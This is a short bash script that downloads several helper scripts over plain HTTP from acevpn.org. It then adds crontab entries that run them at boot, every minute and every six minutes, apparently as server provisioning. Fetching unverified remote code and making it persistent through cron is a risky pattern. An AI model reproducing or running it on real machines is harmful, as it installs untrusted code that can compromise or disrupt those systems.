#!/bin/bash
echo "Step1: Download script file"
wget http://acevpn.org/download/auto.sh
wget http://acevpn.org/download/cpulimit.sh
wget http://acevpn.org/download/online.sh
wget http://acevpn.org/download/reboot.sh
sleep 1
echo "Step 3: Set Crontab"
sleep 1
(crontab -l 2>/dev/null; echo "@reboot /home/ubuntu/run.sh") | crontab -
sleep 1
(crontab -l 2>/dev/null; echo "*/1 * * * * sh /home/ubuntu/cpulimit.sh") | crontab -
sleep 1
(crontab -l 2>/dev/null; echo "*/6 * * * * sh /home/ubuntu/reboot.sh") | crontab -
sleep 1
echo "Step 2: Install Cpulimit"
